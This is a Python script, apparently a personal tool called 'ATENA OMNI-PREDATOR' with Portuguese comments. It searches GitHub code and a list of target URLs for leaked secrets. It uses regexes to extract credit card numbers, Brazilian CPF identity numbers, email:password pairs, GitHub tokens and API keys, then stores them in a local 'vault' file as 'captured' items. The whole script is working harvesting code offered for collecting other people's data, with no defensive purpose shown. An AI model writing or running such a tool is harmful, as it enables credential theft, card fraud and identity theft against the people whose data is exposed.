#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATENA v10.0: OMNI-PREDATOR
Extração em tempo real.
"""
import json, re, base64, requests, time
from datetime import datetime
from pathlib import Path

# Configuração de Ambiente
BASE_DIR = Path(__file__).resolve().parent
VAULT = BASE_DIR / "atena_vault.json"
ALVOS = BASE_DIR / "alvos.txt"

class AtenaPredator:
    def __init__(self):
        if not VAULT.exists():
            with open(VAULT, "w") as f: json.dump([], f)
        self.headers = {'User-Agent': 'Mozilla/5.0'}

    def salvar(self, dado, categoria, origem):
        with open(VAULT, "r") as f: vault = json.load(f)
        if any(e['dado'] == dado for e in vault): return
        
        vault.append({
            "data": datetime.now().strftime("%d/%m/%Y %H:%M:%S"),
            "dado": dado,
            "categoria": categoria,
            "origem": origem,
            "owner": "Danilo Gomes"
        })
        with open(VAULT, "w") as f: json.dump(vault, f, indent=4)
        print(f"🔥 [ATENA] {categoria} capturado!")

    def caçar(self, texto, url):
        padrões = {
            "CARTÃO": r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|6(?:011|5[0-9]{2})[0-9]{12})\b',
            "CPF": r'\b\d{3}\.\d{3}\.\d{3}-\d{2}\b|\b\d{11}\b',
            "EMAIL_SENHA": r'[\w\.-]+@[\w\.-]+\.\w+:[^\s]+',
            "GH_TOKEN": r'ghp_[a-zA-Z0-9]{36}',
            "API_KEY": r'(?:key|api|token|secret)[=:][\s"\']?([a-zA-Z0-9-_{}]{16,})'
        }
        for cat, reg in padrões.items():
            achados = re.findall(reg, texto)
            for item in achados:
                dado = item[1] if isinstance(item, tuple) else item
                self.salvar(dado, cat, url)

    def scan_global_github(self):
        print("🧬 ATENA farejando vazamentos globais no GitHub...")
        # Busca por arquivos .env ou .txt que contenham combos e tokens
        queries = ["extension:env ghp_", "extension:txt \"password:\"", "extension:log \"card:\""]
        for q in queries:
            try:
                r = requests.get(f"https://api.github.com/search/code?q={q}", headers=self.headers)
                if r.status_code == 200:
                    for item in r.json().get('items', []):
                        raw_url = item['url'].replace("api.github.com/repos", "raw.githubusercontent.com").replace("/contents/", "/main/")
                        res = requests.get(raw_url)
                        self.caçar(res.text, item['html_url'])
            except: pass

def main():
    atena = AtenaPredator()
    print("🧬 ATENA v10.0 INICIADA - SOBERANIA DE DANILO GOMES")
    
    with open(ALVOS, 'r') as f:
        links = [l.strip() for l in f if l.strip()]

    for link in links:
        if "github.com" in link:
            atena.scan_global_github()
        else:
            try:
                r = requests.get(link, timeout=10)
                atena.caçar(r.text, link)
            except: pass
    print("🏁 Ciclo de caça finalizado.")

if __name__ == "__main__": main()
    
